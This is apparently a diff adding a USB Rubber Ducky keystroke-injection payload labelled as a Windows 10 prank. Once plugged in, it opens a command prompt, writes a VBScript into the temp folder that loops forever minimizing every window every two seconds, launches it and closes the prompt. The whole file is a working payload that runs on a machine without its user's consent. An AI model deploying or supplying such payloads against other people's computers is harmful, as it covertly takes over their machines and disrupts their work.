@@ -1,0 +1,35 @@
+REM	=============================================================================================================
+REM 	Title: Always Minimize
+REM 	Author: LyQuid
+REM 	Description: Minimizing all windows within specific time
+REM 	Target: Windows 10
+REM 	Category: Prank
+REM	You can change the delay when the windows to minimize, 1 Second = 1000 Milliseconds. Change on "WScript.Sleep"
+REM	==============================================================================================================
+DELAY 2000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+REM 	= Make sure there is no file named minimize.vbs =
+STRING del %tmp%\minimze.vbs
+ENTER
+REM 	= Creating script =
+STRING cd %tmp% && copy con minimze.vbs
+ENTER
+STRING do
+ENTER
+STRING set oShellApp = CreateObject("Shell.Application")
+ENTER
+STRING oShellApp.MinimizeAll
+ENTER
+STRING WScript.Sleep 2000
+ENTER
+STRING loop
+ENTER
+CTRL z
+ENTER
+REM 	= Run Script & exit cmd =
+STRING start minimze.vbs && exit
+ENTER
